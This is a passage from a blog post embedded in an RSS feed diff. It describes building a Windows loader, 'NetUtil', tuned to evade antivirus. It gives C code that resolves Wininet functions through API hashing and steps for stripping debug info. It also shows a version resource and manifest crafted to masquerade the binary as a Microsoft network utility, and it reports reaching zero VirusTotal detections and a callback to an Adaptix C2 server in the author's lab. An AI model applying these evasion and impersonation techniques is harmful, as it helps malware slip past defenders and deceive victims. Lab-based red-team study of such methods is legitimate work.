+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">DEBUG_PRINT</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">InternetOpenUrlW</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74"> address: 0x%p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, pHashedApis<span style="color:#f92672">-&gt;</span>pInternetOpenUrlW);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	pHashedApis<span style="color:#f92672">-&gt;</span>pInternetSetOptionW <span style="color:#f92672">=</span> (fnInternetSetOptionW)<span style="color:#a6e22e">GetProcAddressCustom</span>(pWininet, InternetSetOptionW_FnvvW);
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>pHashedApis<span style="color:#f92672">-&gt;</span>pInternetSetOptionW) {
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">DEBUG_PRINT</span>(<span style="color:#e6db74">&#34;Failed to resolve InternetSetOptionW.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> FALSE;
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">DEBUG_PRINT</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">InternetSetOptionW</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74"> address: 0x%p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, pHashedApis<span style="color:#f92672">-&gt;</span>pInternetSetOptionW);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	pHashedApis<span style="color:#f92672">-&gt;</span>pInternetReadFile <span style="color:#f92672">=</span> (fnInternetReadFile)<span style="color:#a6e22e">GetProcAddressCustom</span>(pWininet, InternetReadFile_FnvvW);
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>pHashedApis<span style="color:#f92672">-&gt;</span>pInternetReadFile) {
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">DEBUG_PRINT</span>(<span style="color:#e6db74">&#34;Failed to resolve InternetReadFile.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> FALSE;
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">DEBUG_PRINT</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">InternetReadFile</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74"> address: 0x%p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, pHashedApis<span style="color:#f92672">-&gt;</span>pInternetReadFile);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	pHashedApis<span style="color:#f92672">-&gt;</span>pInternetCloseHandle <span style="color:#f92672">=</span> (fnInternetCloseHandle)<span style="color:#a6e22e">GetProcAddressCustom</span>(pWininet, InternetCloseHandle_FnvvW);
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>pHashedApis<span style="color:#f92672">-&gt;</span>pInternetCloseHandle) {
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">DEBUG_PRINT</span>(<span style="color:#e6db74">&#34;Failed to resolve InternetCloseHandle.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> FALSE;
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">DEBUG_PRINT</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">InternetCloseHandle</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74"> address: 0x%p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, pHashedApis<span style="color:#f92672">-&gt;</span>pInternetCloseHandle);
+</span></span><span style="display:flex;"><span>	
+</span></span><span style="display:flex;"><span>	<span style="color:#f92672">*</span>ppHashedApis <span style="color:#f92672">=</span> pHashedApis;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> TRUE;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>It removed the <code>Wininet.dll</code> file and the functions being imported from the IAT but at the cost of hardcoded <code>Wininet.dll</code> string in the source code as I had to load the library manually through <code>LoadLibraryW</code> for function resolution through hashes.</p>
+<p><img src="./NetUtil5.5-iat.png" alt="NetUtil5.5-iat"></p>
+<p>This further decreased the the detection rate to 4.</p>
+<p><img src="./NetUtil5.5-virustotal.png" alt="NetUtil5.5-virustotal"></p>
+<h2 id="binary-attributes">Binary attributes</h2>
+<h3 id="debug-information">Debug Information</h3>
+<p>Next, I had to target the <code>.pdb</code> path I left foolishly in the build. Visual Studio provides the option to opt-out from publishing debug info at: <strong>Project Properties &gt; Linker &gt; Debugging</strong> - setting <strong>Generate Debug Info</strong> to <strong>No</strong>.</p>
+<h3 id="version-and-manifest">Version and Manifest</h3>
+<p>Creating a <code>NetUtil.rc</code> resource file, I further added a Version resource within it. I crafted the following version file to masquerade the binary as a Microsoft utility.</p>
+<p><img src="./NetUtil-version.png" alt="NetUtil-version"></p>
+<p>For the manifest, I created <code>app.manifest</code> file with following contents that defines:</p>
+<ul>
+<li>This application does not need UAC invocation</li>
+<li>This application is compatible across different microsoft versions (<code>supportedOS</code> GUIDs dervied from: <a href="https://learn.microsoft.com/en-us/windows/win32/sysinfo/targeting-your-application-at-windows-8-1">https://learn.microsoft.com/en-us/windows/win32/sysinfo/targeting-your-application-at-windows-8-1</a>)</li>
+<li>This application is DPI aware</li>
+</ul>
+<p>to further add onto pseduo-legitimacy.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34; encoding=&#34;utf-8&#34;?&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;assembly</span> <span style="color:#a6e22e">manifestVersion=</span><span style="color:#e6db74">&#34;1.0&#34;</span>
+</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">xmlns=</span><span style="color:#e6db74">&#34;urn:schemas-microsoft-com:asm.v1&#34;</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&lt;assemblyIdentity</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">version=</span><span style="color:#e6db74">&#34;5.6.0.1&#34;</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">processorArchitecture=</span><span style="color:#e6db74">&#34;amd64&#34;</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">name=</span><span style="color:#e6db74">&#34;Microsoft.Windows.NetworkUtil&#34;</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">type=</span><span style="color:#e6db74">&#34;win32&#34;</span> <span style="color:#f92672">/&gt;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&lt;description&gt;</span>Network Diagnostic Utility<span style="color:#f92672">&lt;/description&gt;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">&lt;!-- UAC --&gt;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&lt;trustInfo</span> <span style="color:#a6e22e">xmlns=</span><span style="color:#e6db74">&#34;urn:schemas-microsoft-com:asm.v3&#34;</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;security&gt;</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&lt;requestedPrivileges&gt;</span>
+</span></span><span style="display:flex;"><span>          <span style="color:#75715e">&lt;!--
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">            UAC settings:
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">            - app should run at same integrity level as calling process
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">            - app does not need to manipulate windows belonging to
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">              higher-integrity-level processes
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">            --&gt;</span>
+</span></span><span style="display:flex;"><span>          <span style="color:#f92672">&lt;requestedExecutionLevel</span>
+</span></span><span style="display:flex;"><span>              <span style="color:#a6e22e">level=</span><span style="color:#e6db74">&#34;asInvoker&#34;</span>
+</span></span><span style="display:flex;"><span>              <span style="color:#a6e22e">uiAccess=</span><span style="color:#e6db74">&#34;false&#34;</span>
+</span></span><span style="display:flex;"><span>          <span style="color:#f92672">/&gt;</span>   
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&lt;/requestedPrivileges&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;/security&gt;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&lt;/trustInfo&gt;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">&lt;!-- OS compatibility --&gt;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&lt;compatibility</span> <span style="color:#a6e22e">xmlns=</span><span style="color:#e6db74">&#34;urn:schemas-microsoft-com:compatibility.v1&#34;</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;application&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">&lt;!-- Windows 10 and Windows 11 --&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;supportedOS</span> <span style="color:#a6e22e">Id=</span><span style="color:#e6db74">&#34;{8e0f7a12-bfb3-4fe8-b9a5-48fd50a15a9a}&#34;</span><span style="color:#f92672">/&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">&lt;!-- Windows 8.1 --&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;supportedOS</span> <span style="color:#a6e22e">Id=</span><span style="color:#e6db74">&#34;{1f676c76-80e1-4239-95bb-83d0f6d0da78}&#34;</span><span style="color:#f92672">/&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">&lt;!-- Windows 8 --&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;supportedOS</span> <span style="color:#a6e22e">Id=</span><span style="color:#e6db74">&#34;{4a2f28e3-53b9-4441-ba9c-d69d4a4a6e38}&#34;</span><span style="color:#f92672">/&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">&lt;!-- Windows 7 --&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;supportedOS</span> <span style="color:#a6e22e">Id=</span><span style="color:#e6db74">&#34;{35138b9a-5d96-4fbd-8e2d-a2440225f93a}&#34;</span><span style="color:#f92672">/&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">&lt;!-- Windows Vista --&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;supportedOS</span> <span style="color:#a6e22e">Id=</span><span style="color:#e6db74">&#34;{e2011457-1546-43c5-a5fe-008deee3d3f0}&#34;</span><span style="color:#f92672">/&gt;</span> 
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;/application&gt;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&lt;/compatibility&gt;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">&lt;!-- DPI awareness --&gt;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&lt;application</span> <span style="color:#a6e22e">xmlns=</span><span style="color:#e6db74">&#34;urn:schemas-microsoft-com:asm.v3&#34;</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;windowsSettings&gt;</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&lt;dpiAware</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">xmlns=</span><span style="color:#e6db74">&#34;http://schemas.microsoft.com/SMI/2005/WindowsSettings&#34;</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>        true
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&lt;/dpiAware&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;/windowsSettings&gt;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&lt;/application&gt;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/assembly&gt;</span>
+</span></span></code></pre></div><p>Next, in <strong>Project properties &gt; Linker &gt; Manifest File</strong>, ensuring that <strong>Generate Manifest</strong> is <strong>Yes</strong>, I set <strong>Enable User Access Control (UAC)</strong> to <strong>No</strong> as I already defined the same in the XML above.</p>
+<p>Within <strong>Project properties &gt; Manifest Tool &gt; Input and Output &gt; Additional Manifest Files</strong> I added my <code>app.manifest</code> file.</p>
+<p>Finally, while building the project I encountered the following errors:</p>
+<p><img src="./NetUtil-version-build-error.png" alt="NetUtil-version-build-error"></p>
+<p>To include macro definitions, I prefixed <code>#include &lt;windef.h&gt;</code> before <code>#include &quot;resource.h&quot;</code> include statement, it further fixed all other build errors mentioned above so I flew with it.</p>
+<h3 id="benchmarking">Benchmarking</h3>
+<p>This release build finally landed 0 detections on virustotal.</p>
+<p><img src="./NetUtil-version-build-error.png" alt="NetUtil-version-build-error"></p>
+<h2 id="in-the-trenches">In the trenches</h2>
+<p>Throwing this final build onto my SOC-SIEM lab gave me successful connection onto Adaptix C2. Unlike the previous attempt where a debug build (may be helping in lowering entropy) was the loader that succeeded, here the final release build was used.</p>
+<p><img src="./NetUtil-adaptix-callback.png" alt="NetUtil-adaptix-callback"></p>
+]]></description>
+      
+    </item>
+    
     
     
     <item>
